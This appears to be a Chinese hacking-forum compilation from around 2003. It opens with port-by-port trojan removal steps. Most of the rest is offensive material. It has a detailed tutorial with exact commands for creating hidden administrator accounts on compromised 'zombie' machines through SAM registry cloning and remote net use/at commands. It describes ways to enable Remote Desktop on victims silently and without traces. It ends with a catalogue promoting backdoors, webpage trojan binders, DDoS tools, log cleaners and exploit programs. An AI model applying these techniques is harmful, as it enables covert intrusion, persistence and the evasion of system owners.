      1、编辑注册表，删除HKEY_LOCAL_MACHINE\SOFTWARE\MicroSoft\Windows\CurrentVersion\Run
        项中的‘System32‘=c:\windows\system32.exe键值（版本1.0）或
        ‘SystemTray‘ = ‘Systray.exe‘ 键值（版本2.0-3.0)键值
      3、重新启动机器后删除c:\windows\system32.exe（版本1.0）
         或c:\windows\system\systray.exe（版本2.0-3.0）

6939 端口的关闭：
      这个端口是木马程序Indoctrination默认的服务端口，清除该木马的方法如下：
      1、编辑注册表，删除
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ 
      HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\ 
      HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ 
      HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce\
      四项中所有包含Msgsrv16 ="msgserv16.exe"的键值
      2、重新启动机器后删除C:\windows\system\目录下的msgserv16.exe文件

 6969端口的关闭：
      这个端口是木马程序PRIORITY的默认服务端口，清除该木马的方法如下：
      1、编辑注册表，删除
         HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Services
         项中的"PServer"= C:\Windows\System\PServer.exe键值
      2、重新启动系统后删除C:\Windows\System\目录下的PServer.exe文件

7306端口的关闭：
      这个端口是木马程序网络精灵的默认服务端口，该木马删除方法如下：
      1、你可以使用fport察看7306端口由哪个程序监听，记下程序名称和所在的路径
      2、如果程序名为Netspy.exe，你可以在命令行方式下到该程序所在目录输入命令
         Netspy.exe /remove来删除木马
      3、如果是其他名字的程序，请先在进程中结束该程序的进程，然后到相应目录下删除该程序
      4、编辑注册表，将HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\ CurrentVersion\Run
         项和HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\ CurrentVersion\RunServices
         项中与该程序有关的键值删除

7511端口的关闭：
       7511是木马程序聪明基因的默认连接端口，该木马删除方法如下：
       1、首先使用进程管理工具杀掉MBBManager.exe这个进程
       2、删除c:\winnt（系统安装目录）中的MBBManager.exe和Explore32.exe程序文件，
          删除c:\winnt\system32目录下的editor.exe文件
       3、编辑注册表，删除注册表
          HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
          项中内容为C:\WINNT\MBBManager.exe键名为MainBroad BackManager的项
       4、修改注册表HKEY_CLASSES_ROOT\txtfile\shell\open\command中的
          c:\winnt\system32\editor.exe %1改为c:\winnt\NOTEPAD.EXE %1
       5、修改注册表HKEY_LOCAL_MACHINE\Software\CLASSES\hlpfile\shell\open\command
          项中的C:\WINNT\explore32.exe %1键值改为C:\WINNT\WINHLP32.EXE %1


7626端口的关闭：
       7626是木马冰河的默认开放端口（这个端口可以改变），木马删除方法如下：
       1、启动机器到安全模式下，编辑注册表，删除
          HKEY_LOCAL_MACHINE\software\microsoft\windows\ CurrentVersion\Run
          项中内容为c:\winnt\system32\Kernel32.exe的键值
       2、删除HKEY_LOCAL_MACHINE\software\microsoft\windows\ CurrentVersion\Runservices
          项中内容为C:\windows\system32\Kernel32.exe的键值
       3、修改HKEY_CLASSES_ROOT\txtfile\shell\open\command项下的
          C:\winnt\system32\Sysexplr.exe %1为C:\winnt\notepad.exe %1
       4、到C:\Windows\system32\下删除文件Kernel32.exe和Sysexplr.exe

8011端口的关闭：
       8011端口是木马程序WAY2.4的默认服务端口，该木马删除方法如下：
       1、首先使用进程管理工具杀掉msgsvc.exe的进程
       2、到C:\windows\system目录下删除msgsvc.exe文件
       3、编辑注册表，删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
          项中内容为C:\WINDOWS\SYSTEM\msgsvc.exe的键值

9989端口的关闭：
       这个端口是木马程序InIkiller的默认服务端口，该木马删除方法如下：
       1、编辑注册表，删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
         项中的Explore="C:\windows\bad.exe"键值
       2、重新启动系统后删除C:\windows目录下的bad.exe程序文件

19191端口的关闭：
       这个端口是木马程序兰色火焰默认开放的telnet端口，该木马关闭方法如下：
       1、使用管理工具结束进程tasksvc.exe
       2、删除c:\windows\system目录下的tasksvc.exe、sysexpl.exe、bfhook.dll三个文件
       3、编辑注册表，删除HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
          项中的Network Services=C:\WINDOWS\SYSTEM\tasksvc.exe键值
       4、将注册表HKEY_CLASSES_ROOT\txtfile\shell\open\command
项中的C:\WINDOWS\SYSTEM\sysexpl.exe "%1"
          键值改为c:\windows\notepad.exe "%1"键值
       5、将注册表HKEY_LOCAL_MACHINE\Software\CLASSES\txtfile\shell\open\command
          项中的C:\WINDOWS\SYSTEM\sysexpl.exe "%1键值"改为c:\windows\notepad.exe "%1"

1029端口和20168端口：
      这两个端口是lovgate蠕虫所开放的后门端口。
      蠕虫相关信息请参见：Lovgate蠕虫
      你可以下载专杀工具：FixLGate.exe
      使用方法：下载后直接运行，在该程序运行结束后重起机器后再运行一遍该程序。
 
23444端口的关闭方法：
      这个端口是木马程序网络公牛的默认服务端口，关闭该木马的方法如下：
      1、进入安全模式，删除c:\winnt\system32\下的CheckDll.exe文件
      2、将系统中的如下文件的大小与正常系统中的文件大小比较，如果大小不一样请删除，然
         后将正常的文件拷贝回来，需要检查的文件包括：
         notepad.exe；write.exe，regedit.exe，winmine.exe，winhelp.exe
       3、替换回正常文件后进入注册表编辑状态，删除
          HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
          项中的"CheckDll.exe"="C:\WINNT\SYSTEM32\CheckDll.exe“键值
       4、删除HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\ CurrentVersion\RunServices
          中的"CheckDll.exe"="C:\WINNT\SYSTEM32\CheckDll.exe"键值
       5、删除HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run
          中的"CheckDll.exe"="C:\WINNT\SYSTEM32\CheckDll.exe"键值
          请注意该病毒还可能会捆绑在其他应用软件上，请检查你的软件大小是否有异，
          如果有请卸载后重装

27374端口的关闭方法：
      这个端口是木马程序SUB7的默认服务端口，关闭该木马方法如下：
      1、首先使用fport软件确定出27374端口由哪个程序打开，记下程序名称和所在的路径。
      2、编辑注册表，将HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
         项中包含刚才使用fport察看出的文件名的键值删除
      3、将HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServic
         项中包含刚才使用fport察看出的文件名的键值删除
      4、在进程中将刚才察看的文件进程杀掉，如果杀不掉请到服务中将关联该程序的服务关
        掉（服务名应该是刚才在注册表RunServic中看到的）
      5、编辑win.ini文件，检查“run=”后有没有刚才的文件名，如有则删除之
      6、编辑system.ini文件，检查“shell=explorer.exe”后有没有刚才那个文件，如有将它删除
      7、到相应的目录中将刚才查到的文件删除。

30100端口的关闭：
     这个端口是木马程序NetSphere默认的服务端口，清除该木马方法如下：
     1、编辑注册表，删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
        项中的NSSX ="C:\WINDOWS\system\nssx.exe"键值
     2、删除HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run中的
        NSSX ="C:\WINDOWS\system\nssx.exe"键值
     3、删除HKEY_USERS\****\Software\Microsoft\Windows\CurrentVersion\Run 中的
        NSSX ="C:\WINDOWS\system\nssx.exe"键值
     4、重新启动系统后删除删除C:\WINDOWS\system\目录下的nssx.exe文件

31337端口的关闭：
      这个端口是木马程序BO2000的默认服务端口，清除该木马方法如下：
      1、将机器启动到安全模式状态
      2、编辑注册表，删除
         \HEKY-LOCAL-MACHINE\Software\Microsoft\Windows\ CurrentVersion\RunServicse
         项中包含Umgr32.exe的键值
      3、删除\Windows\System目录下的Umgr32.exe程序
      4、重新启动机器

45576端口：
      这是一个代理软件的控制端口，请先确定该代理软件并非你自己安装（代理软件会给你的机器带
      来额外的流量）
      关闭代理软件：
      1.请先使用fport察看出该代理软件所在的位置
      2.在服务中关闭该服务（通常为SkSocks），将该服务关掉。
      3.到该程序所在目录下将该程序删除。

50766端口的关闭：
      这个端口是木马程序Schwindler的默认服务端口，清除该木马的方法如下：
      1、编辑注册表，删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
         项中的User.exe = "C:\WINDOWS\User.exe"键值
      2、重新启动机器后删除c:\windows\目录下的user.exe文件

61466端口的关闭：
      这个端口是木马程序Telecommando的默认服务端口，关闭该木马程序方法如下：
      1、编辑注册表，删除HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
         中的SystemApp＝"ODBC.EXE"键值
      2、重新启动机器后删除C:\windows\system\目录下的ODBC.EXE文件

 


【建立隐藏的超级用户】
 建立隐藏的超级用户 
一、如何在图形界面建立隐藏的超级用户 
图形界面下适用本地或开3389终端服务的肉鸡上。上面我提到的那位作者说的方法很好，但是较为复杂，
还要用到psu.exe(让程序以系统用户身份运行的程序），如果在肉鸡上的话还要上传psu.exe。
我说的这个方法将不用到psu.exe这个程序。因为windows2000有两个注册表编辑器:regedit.exe和regedt32.exe。
XP中regedit.exe和regedt32.exe实为一个程序，修改键值的权限时在右键中点“权限”来修改。
对regedit.exe我想大家都很熟悉，但却不能对注册表的项键设置权限，
而regedt32.exe最大的优点就是能够对注册表的项键设置权限。nt/2000/xp的帐户信息
都在注册表的HKEY_LOCAL_MACHINE\SAM\SAM键下，但是除了系统用户SYSTEM外，其它用户都无权查看到里面的信息，
因此我首先用regedt32.exe对SAM键为我设置为“完全控制”权限。这样就可以对SAM键内的信息进行读写了了。具体步聚如下： 

1、假设我们是以超级用户administrator登录到开有终端服务的肉鸡上的，
首先在命令行下或帐户管理器中建立一个帐户:hacker$,这里我在命令行下建立这个帐户 

net user hacker$ 1234 /add 

2、在开始/运行中输入:regedt32.exe并回车来运行regedt32.exe。 

3、点“权限”以后会弹出窗口 

点添加将我登录时的帐户添加到安全栏内，这里我是以administrator的身份登录的，
所以我就将administrator加入，并设置权限为“完全控制"。
这里需要说明一下:最好是添加你登录的帐户或帐户所在的组，切莫修改原有的帐户或组，
否则将会带来一系列不必要的问题。等隐藏超级用户建好以，再来这里将你添加的帐户删除即可。 

4、再点“开始”→“运行”并输入"regedit.exe" 回车,启动注册表编辑器regedit.exe。 

打开键：HKEY_LOCAL_MAICHINE\SAM\SAM\Domains\account\user\names\hacker$" 

5、将项hacker$、00000409、000001F4导出为hacker.reg、409.reg、1f4.reg，
用记事本分别打这几个导出的文件进行编辑，将超级用户对应的项000001F4下的键"F"的值复制，
并覆盖hacker$对应的项00000409下的键"F"的值,然后再将00000409.reg与hacker.reg合并。 

6、在命令行下执行net user hacker$ /del将用户hacker$删除：net user hacker$ /del 

7、在regedit.exe的窗口内按F5刷新，然后打文件-导入注册表文件将修改好的hacker.reg导入注册表即可 

8、到此，隐藏的超级用户hacker$已经建好了，然后关闭regedit.exe。在regedt32.exe窗口内把
HKEY_LOCAL_MACHINE\SAM\SAM键权限改回原来的样子（只要删除添加的帐户administrator即可）。 

9、注意：隐藏的超级用户建好后，在帐户管理器看不到hacker$这个用户，在命令行用“net user”
命令也看不到，但是超级用户建立以后，就不能再改密码了，如果用net user命令来改hacker$的密码的话，
那么在帐户管理器中将又会看这个隐藏的超级用户了，而且不能删除。 

-----------------------------------------------------------
二。如何在命令行下远程建立隐藏的超级用户 

在这里将用at的命令，因为用at产生的计划任务是以系统身份运行的，所以也用不到psu.exe程序。
为了能够使用at命令，肉鸡必须开有schedule的服务，如果没有开启，可用流光里带的工具netsvc.exe或sc.exe来远程启动，
当然其方法也可以，只要能启动schedule服务就行。 

对于命令行方式，你可以采用各种连接方式，如用SQLexec连接MSSQL的1433端口，也可以用telnet服务，
只要以你能得到一个cmdshell，并且有运行at命令的权限就可以。 

1、首先找到一台肉鸡，至于如何来找那不是我这里所说的话题。这里先假设找到一台超级用户为administrator,
密码为12345678的肉鸡，现在我们开始在命令行下远程为它建立隐藏的超级用户。（例子中的主机是我的局域网内的一台主机，
我将它的ip地址改为13.50.97.238,，请勿在互联网上对号入座,以免骚扰正常的ip地址。） 
2、先与肉鸡建立连接,命令为: net use \\13.50.97.238\ipc$ "12345678" /user:"administrator 

3、用at命令在肉鸡上建立一个用户(如果at服务没有启动，可用小榕的netsvc.exe或sc.exe来远程启动):at \\13.50.97.238 12:51 

c:\winnt\system32\net.exe user hacker$ 1234 /add 

建立这个加有$符的用户名，是因为加有$符后，命令行下用net user将不显示这个用户，但在帐户管理器却能看到这个用户。 

4、同样用at命令导出HKEY_LOCAL_MACHINE\sam\sam\Domains\account\users下键值：at \\13.50.97.238 12:55 

c:\winnt\regedit.exe /e hacker.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\account\users\ 

/e 是regedit.exe的参数，在_LOCAL_MACHINE\SAM\SAM\Domains\account\users\这个键的一定要以\结尾。
必要的情况下可以用引号将"c:\winnt\regedit.exe /e hacker.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\account\users\"引起来。 

5、将肉鸡上的hacker.reg下载到本机上用记事本打开进行编辑命令为：copy \\13.50.97.238\admin$\system32\hacker.reg 

c:\hacker.reg 

修改的方法图形界中已经介绍过了，这里就不作介绍了。 

6、再将编辑好的hacker.reg拷回肉鸡上 copy c:\hacker.reg \\13.50.97.238\admin$\system32\hacker1.reg 

7、查看肉鸡时间：net time \\13.50.97.238 然后用at命令将用户hacker$删除: 

at \\13.50.97.238 13:40 net user hacker$ /del 

8、验证hacker$是否删除:用 

net use \\13.50.97.238 /del 断开与肉鸡的连接。 

net use \\13.50.97.238\ipc$ "1234" /user:"hacker$" 用帐户hacker$与肉鸡连接，不能连接说明已删除。 

9、再与肉鸡建立连接：net use \\13.50.97.238\ipc$ "12345678" /user:"administrator" 

再取得肉鸡时间，用at命令将拷回肉鸡的hacker1.reg导入肉鸡注册表: 

at \\13.50.97.238 13:41 c:\winnt\regedit.exe /s hacker1.reg 

regedit.exe的参数/s是指安静模式。 

10、再验证hacker$是否已建立，方法同上面验证hacker$是否被删除一样。 

11、再验证用户hacker$是否有读、写、删的权限，如果不放心，你还可验证是否能建立其它帐户。 

12、通过11可以断定用户hacker$具有超级用户权限，因为最初我用at命令建立它的时候是一个普通用户，
而现在却具有远程读、写、删的权限。 

--------------------------------------------------------------------
三、如果肉鸡没有开3389终端服务，而我又不想用命令行，怎么办？ 
这种情况下，你也可以用界面方式来远程为肉鸡建立隐藏的超级用户。因为regedit.exe、
regedt32.exe都有连接网络注册表的功能，你可以用regedt32.exe来为远程主机的注册表项设置权限，
用regedit.exe来编辑远程注册表。帐户管理器也有一项连另一台计算机的功能，你可以用帐户管理器为远程主机建立和删除帐户。
具体步聚与上面介绍的相似，我就不多说了，只它的速度实在是令人难以忍受。 

但是这里有两个前提：

1、先用net use \\肉鸡ip\ipc$ "密码" /user:"超级用户名"来与远程主机建立连接以后，
才能用regedit.exe regedt32.exe及帐户管理器与远程主机连接。 

2、远程主机必须开启远程注册表服务（没有开启的话，你也可以远程开启，因为你有超级用户的密码了）。 

-----------------------------------------------------------------------
四、利用被禁用的帐户建立隐藏的超级用户： 

我们可以用肉鸡上被禁止的用户来建立隐藏的超组用户.方法如下: 

1．想办法查看有哪些用户被细心的管理员禁止，一般情况下，有些管理员出于安全考虑，通常会将guest禁用，
当然了会禁用其它用户。在图形界面下，非常容易，只要在帐户管理器中就可以看到被禁用的帐户上有一个红叉；
而在命令行下，我还没有想到好的办法，只能在命令行下用命令："net user 用户名"一个一个来查看用户是否被禁用。 

2．在这里，我们假设用户hacker被管理员禁用。首先，我先用小榕的超组用户克隆程序CA.exe，将被禁用的用户hacker 
克隆成超级用户（克隆之后，被禁用的用户hacker就会自动被激活了）: CA.EXE \\肉鸡ip Administrator 超级用户密码
hacher hacher密码。 

3．如果你现在一个cmdshell，如利用telnet服务或SQLEXEC连接肉鸡的msSQL的默认端口1433得到的shell都可以，
这时你只要输入命令： 

net user hacker /active:no 这样用户hacker就被禁用了（至少表面上是这样的），
当然你也可以将用户hacher换成其它的被禁用的用户。 

4．这时如果你在图形界面下看帐户管理器中的用户时,会发现用户hacker被禁用了，
但事实上是这样的吗？你用这个被禁用的用户连接一下肉鸡看看是否能连上？
用命令：net user \\肉鸡ip\ipc$ "hacker密码" /user:"hacker" 连一连看看。
我可以告诉大家，经过我多次试验，次次都能成功，而且还是超级用户权限。 

5．如果没有cmdshell怎么办？你可以我上面介绍的at命令来禁用用户hacker;
命令格式：at \\肉鸡ip 时间 net user hacker /active:no 

6．原理：具体的高深的原理我也说不上来，我只能从最简单的说。
你先在图形界面下在帐户管理器中禁用一下超级用户administrator看看，
肯定会弹出一对话框，并禁止你继续禁用超级用户administrator，同样，
因为在克隆时，hacker在注册表的"F"键被超级用户administrator在注册表的"F"键所替代，
因而hacker就具有了超级用户的权限了，但是由于hacker在注册表内"C"健还是原来的"C"键，
所以hacker还是会被禁用，但是它的超级用户权限却不会被禁用，因此被禁用的用户hacker还是可以连接肉鸡，
而且还具有超级用户的权限。具体我也说不明白，大家权且这么理解吧。 

-----------------------------------------------------------------------------------
五、注意的几点事项： 

1、隐藏的超级用户建立以后，在帐户管理器中和命令行下均看不到这个用户，但这个用户却存在。 

2、隐藏的超级用户建立以后，就不能再修改密码了，因为一旦修改密码，这个隐藏的超级用户就会暴露在帐户管理器中，
而且不能删除。 

3、如在本机上试验时，最好用系统自带的备份工具先备份好本机的“系统状态”主要是注册表的备份，因为本人做试验时，
曾出现过帐户管理器中看不到任何用户，组中也看不到任何组的现象，但它们却存在。幸好我有备份,呵呵。
SAM键是毕竟系统最敏感的部位。 

4、本方法在2000/XP上测试通过，未在NT上测试。本方法仅供研究，请勿将本方法用于破坏上，利用本方法造成严重后果者，
由使用者负责，本人概不负责。 



【开3389方法】
怎么样开3389端口，这里我把他们总结一下，很全面,希望对你有用: 
1，打开记事本，编辑内容如下： 
echo [Components] > c:\sql 
echo TSEnable = on >> c:\sql 
sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\sql /q 
编辑好后存为BAT文件，上传至肉鸡，执行。这里值得注意的是要确定winnt是否在c盘，如果在其他盘则需要改动。 


2 (对xp\2000都有效) 脚本文件 本地开3389 工具:rots1.05 
使用方法： 
在命令行方式下使用windows自带的脚本宿主程序cscript.exe调用脚本，例如： 


c:\>cscript ROTS.vbs <目标IP> <用户名> <密码> [服务端口] [自动重起选项] 


服务端口： 设置终端服务的服务端口。默认是3389。 
自动重起选项： 使用/r表示安装完成后自动重起目标使设置生效。 
使用/fr表示强制重起目标。（如果/r不行，可以试试这个） 
使用此参数时，端口设置不能忽略。 


比如扫描到了一个有NT弱口令的服务器，IP地址是222.222.222.222，管理员帐户是administrator，密码为空 
运行CMD（2000下的DOS），我们给它开终端！ 
命令如下！ 
cscript reg.vbe 222.222.222.222 administrator "" 3389 /fr 
上面的命令应该可以理解吧？cscript reg.vbe这是命令，后面的是IP，然后是管理员帐户，接这是密码，因为222.222.222.222 这台服务器的管理员密码是空的，那就用双引号表示为空，再后面是端口，你可以任意设置终端的端口，/fr是重启命令（强制重启，一般我都用这个，你也可以/r，这是普通重启） 


脚本会判断目标系统类型，如果不是server及以上版本，就会提示你是否要取消。 
因为pro版不能安装终端服务。 
如果你确信脚本判断错误，就继续安装好了。 


如果要对本地使用，IP地址为127.0.0.1或者一个点（用.表示），用户名和密码都为空（用""表示）。 


脚本访问的目标的135端口，如果目标135端口未开放，或者WMI服务关闭，那么脚本就没用了。 


3，下载3389自动安装程序-djshao正式版5.0 
说明： 
解压djshao5.0.zip,用你的随便什么方法把把解压出来的djxyxs.exe上传到肉鸡的c:\winnt\temp下，然后进入c:\winnt\temp目录执行djxyxs.exe解压缩文件，然后再执行解压缩出来的azzd.exe文件，等一会肉鸡会自动重启！重启后会出现终端服务！ 


特点：1、不用修改注册表的安装路径，注册表会自动修改，安装完后会自动恢复到原来的安装路径，2、在后台安静模式运行，就算肉鸡旁有人也没有关系！3、在添加和删除中看不出终端服务被安装的痕迹，也就是启动终端前不会打钩，4、不会在肉鸡上留下你的上传文件，在安装完终端服务后会会自动删除你上传到c:\winnt\temp下的任何文件！5、不管肉鸡的winnt装在什么盘上都无所谓！6、安装完终端后会删除在管理工具中的终端快捷图标！7、在没有安装终端前，终端服务是被禁止的！安装终端后，终端服务被改为自动！但是如果在安装前终端服务是手动！安装后就可能还是手动！等重启后就不会打开服务！所以在软件中加了sc指令，等安装完后，不管终端服务是禁止还是手动还是自动，全部改为自动。8、自动检测肉鸡是不是服务器版，如果不是删除原文件，不执行安装，如果是服务器版就执行安装！9、支持中日韩繁四个版本的win2000服务器版！ 


4，下载DameWare NT Utilities 3.66.0.0 注册版 
安装注册完毕后输入对方IP用户名密码，等待出现是否安装的对话框点是。 
复制启动后出现对方桌面。 
在对方桌面进入控制面版，点添加或删除程序。进入后点添加/删除windows组件，找到终端服务，点际进入后在启动终端服务上打上勾。确定自动提示重起，重起后OK 

5.运用远程开启3389软件开启(需要有对方机子的管理员帐号和密码)

6.在自己机上安装一个20cn的ftp服务器,在对方的dos下将本机的3389开启工具下载到对方机子,然后执行.



【开始→运行→输入的命令集锦】
gpedit.msc-----组策略
sndrec32-------录音机
Nslookup-------IP地址侦测器
explorer-------打开资源管理器
logoff---------注销命令
tsshutdn-------60秒倒计时关机命令
lusrmgr.msc----本机用户和组
services.msc---本地服务设置
oobe/msoobe /a----检查XP是否激活
notepad--------打开记事本
cleanmgr-------垃圾整理
net start messenger----开始信使服务
compmgmt.msc---计算机管理
net stop messenger-----停止信使服务
conf-----------启动 netmeeting
dvdplay--------DVD播放器
charmap--------启动字符映射表
diskmgmt.msc---磁盘管理实用程序
calc-----------启动计算器
dfrg.msc-------磁盘碎片整理程序
chkdsk.exe-----Chkdsk磁盘检查
devmgmt.msc--- 设备管理器
regsvr32 /u *.dll----停止dll文件运行
drwtsn32------ 系统医生
rononce -p ----15秒关机
dxdiag---------检查DirectX信息
regedt32-------注册表编辑器
Msconfig.exe---系统配置实用程序
rsop.msc-------组策略结果集
mem.exe--------显示内存使用情况
regedit.exe----注册表
winchat--------XP自带局域网聊天
progman--------程序管理器
winmsd---------系统信息
perfmon.msc----计算机性能监测程序
winver---------检查Windows版本
sfc /scannow-----扫描错误并复原
taskmgr-----任务管理器（2000／xp／2003）


【成为顶级黑客(2003年)必备软件】
成为顶级黑客(2003年)必备软件
 

--------------------------------------------------------------------------------
 
佚名 时间：2003-8-18 15:00:48 
   
CGI后门： 
cgi网页后门 cgi网页后门，envymask编写...《 
网页合并器 本程序可以自动生成网页，可以把网页和EXE合成新的网页，在打开网页的同时自动运行EXE文件.你将木马合并在一个网页中，别人浏览之后，呵呵，我什么都没说~~~ 
海阳顶端网木马 windows环境下永远不会被查杀的木马，因为它是用asp做的，也是一套asp在线极好的网页编辑软件，支持在线更改、编辑、删除任意文本文件，同时最重要的是解决了无组件asp上传...（中文版 
cgi-backdoor 几个cgi木马(十多种利用最新漏洞的web脚本后门，涵盖jsp,php,asp,cgi等等) * 

命令行后门类 
winshell 
WinShell是一个运行在Windows平台上的Telnet服务器软件，主程序是一个仅仅5k左右的可执行文件，可完全独立执行而不依赖于任何系统动态连接库，尽管它体积小小，却功能不凡，支持定制端口、密码保护、多用户登录、NT服务方式、远程文件下载、信息自定义及独特的反DDOS功能等...《入侵NT中winshell的使用》 
Gina 
Gina木马的主要作用是在系统用户登陆时，将用户登陆的名字，登陆密码等记录到文件中去，因为这个DLL是在登陆时加载，所以不存在象findpass那类程序在用户名字是中文或域名是中文等无法得到用户...儒 
Wollf1.5 我们的一位女黑客写的软件，扩展Telnet服务，集成文件传输、Ftp服务器、键盘记录、Sniffer(for win2k only)、端口转发等功能，可反向连接，可通过参数选择随系统启动或作为普通进程启动 
WinEggDrop Shell 1.50最终版在 一个扩展型的telnet后门程序{中国最强的后门} 
********************************************************************************************** 
菜鸟扫描软件！ 
20CN IPC 扫描器正式版 
全自动IPC扫描器，可以同步植入木马，可以透过部分没有配置完整的防火墙，能够探测流光探测不到的一些用户...（中文版） 
网络肉鸡猎手 
一个快速查找网络肉鸡的小工具 
网页信息神探 使得网页不再有秘密，各种信息一目了然，什么电影、图片、Email地址、文章、Flash、压缩文件、可执行文件...等等的链接地址无处可藏！连续而快速下载各种软件、打包教程、VB、VC、动画教程、Flash、电影、写真图片 

************************************************************************************** 
SQL2.exe SQL蠕重听过吧，就是的这个漏洞！ 

NetScanTools 一款功能强大的网络工具包...（英文版） 

dvbbs.exe 
动网logout.asp利用程序 

THCsql 
针对David Litchfield发现的MSSQL OpenDataSource函数漏洞的攻击程序，内含源代码。 

小紫V2.0追加版 
*小紫*（LB论坛噩梦）V2.0追加版加入LB.EXE，可以获得论坛管理员权限。 


LB5论坛轰炸机 
我兄弟写的程序，{推存} 
LB5论坛轰炸机修正版2.5在LB5论坛轰炸机修正版2.0的原有功能基础上增加以下功能及特性：1同时支持6线程轰炸，速度可比V2.0提高一倍以上 2机器智能重新增加,带有自动转向定位功能 3增加监视窗口 4标题可改...（ 

MSN 消息攻击机 
这是一个用于MSN Messenger 的消息攻击机（其实不局限于MSN 的），它具有超快的攻击速度，据测试，在普通Pentium 200 MMX 攻击速度可以达到5条/秒。而且软件体积极小，有效节省系统资源...（ 

怪狗专用版3389登陆器 我改的一个小程序，有用户名密码，用它可以3389登陆win系统，（必备） 

DameWare NT Utilities 
一款功能强大的Windows NT/2000/XP 服务器远程控制软件，只要拥有一个远程主机的管理帐号，就能使用它远程GUI下登陆交互控制主机...（英文版）《 

追捕： 找到IP所在地！ 

柳叶擦眼 
这个小软件可以列出系统所有的进程（包括隐藏的），并可以杀死进程.这个是共享软件...（中文版）《让传奇木马走开》 


Xdebug ey4s大哥写的windows 2000 kernel exploit，有了它提升权限就简单了！ 

代理之狐 可得到最新代理，用于隐藏真实IP，不过，有能力最好自己在肉机上做个代理安全！ 


HackerDicBuilder 本软件属于一款字典制作工具，根据国人设置密码的习惯,利用线程技术，生成字典文件 ... （中文版） 多位朋友点播 


scanipc 这个是木头见过的最傻瓜化的入侵软件了，只要设置好你要上传的后门和IP范围，它就会开始工作了，界面简单实用，全自动IPC扫描器，可以同步植入木马，可以透过部分没有配置完整的防火墙，能够探测流光探测不到的一些用户 ... 


Tiny Honeypot 这是一款简单的蜜罐程序，主要基于iptables的重定向和一个xinetd监听程序，它监听当前没有使用的每个TCP端口记录所有的活动信息，并且提供一些回送信息给入侵者。应答部分全部采用perl程序编写，它提供了足够的交互信息足以愚弄大多数的自动攻击工具和小部分的入侵者。通过缺省的适当限制，该程序可以安装在产品主机上，而几乎不会影响主机的性能（应用平台Linux/POSIX） 

Clearlog 用于删除Windows NT/2K/XP的WWW和FTP安全日志文件，通常入侵某台服务器后为了避免被跟踪，都采用这一方法来消除IP记录 ... 《入侵全攻略》 


LC4 可以检测用户是否使用了不安全的密码，是最好，最快的Win NT/2000 workstations 密码破解工具，目前这是最新版本.它宣称：在P300机器上不到48小时可以破解90%的超级用户(Admin)口令.18%不到10分钟就可以破解出来 ... 

独裁者 DDOS 工具， 此软件太厉害，千万不可烂用，否则可能进监狱！ 

LocatorHack.exe MS Locator!formQueryPacket.wcscpy 远程溢出工具与webdav漏洞一样厉害。Microsoft Windows Locator服务远程缓冲区溢出漏洞 

TFTPD32.exe 图形化的TPTP工具，做黑客这样的工具都没有，说不过去！ 

iis5sp3 说明中说，iis5安装sp3的溢出成功，反正我在sp3下没成功过！ 

smbrelay.exe 可利用网页得到NT密码散列！{推存} 

IECookiesView1.5 可改写cookies信息，有此工具进行cookies欺骗就简单多了， 

HackPass.exe，MD5.exe 破解MD5密码的软件~！ 

DVGetPass.exe 动网tongji.asp漏洞利用工具，可得到论坛管理员权限，再上传ASP木马！呵呵就~~~~ 

webadv 针对iis+sp3的溢出成功率很高(溢出后system权限!) * 

R_ webadv 能用版的webdav漏洞使用工具！听说，日本，繁体都能用， 
ipscan 大范围网段快速ipc$猜解 

svc 远程安装/删除win2k服务 

3389.vbs 远程安装win2k终端服务不需i386 

arpsniffer arp环境sniffer(需要winpcap2.1以上) * 

ascii 查询字符和数字ascii码(常用来对url编码用以躲避ids或脚本过滤) 

ca 远程克隆账号 

cca 检查是否有克隆账号 


crackvnc 远程/本地破解winvnc密码(本地破用-W参数) 

pass.dic 密码字典 

debploit win2k+sp2配置最佳权限提升工具 

fpipe 端口重定向工具 

fscan superscan命令行版本(可定义扫描时的源端口并支持udp端口扫描) * 

hgod04 ddos攻击器 

idahack ida溢出 

idq.dll 利用isapi漏洞提升权限(对sp0+sp1+sp2都非常有效，也是很棒的web后门) 

IIS idq溢出 

inst.zip 指定程序安装为win2k服务 * 

ip_mail.rar 发送主机动态IP的软件 * 

ipc.vbs 不依赖ipc$给远程主机开telnet 

ispc.exe idq.dll连接客户端 

Keyghost.zip 正版键盘记录器 

log.vbs 日志清除器(远程清除不依赖ipc$) 

msadc.pl winnt的msadc漏洞溢出器 * 

MsSqlHack mssql溢出程序1 

mysql-client mysql客户端 

Name.dic 最常用的中国人用户名(看看你常用的用户名在不在里面) 

PassSniffer 大小仅3kb的非交换机sniffer软件 * 

psexec 通过ipc管道直接登录主机 

pskill 杀进程高手 

pslist 列进程高手 

rar 命令行下的中文版winrar(功能相当全面) * 

reboot.vbs 远程重启主机的脚本 

sdemo.zip 巨好的屏幕拍摄的录像软件 

shed 远程查找win9x的共享资源 

sid 用sid列用户名 

SkServerGUI snake多重代理软件 

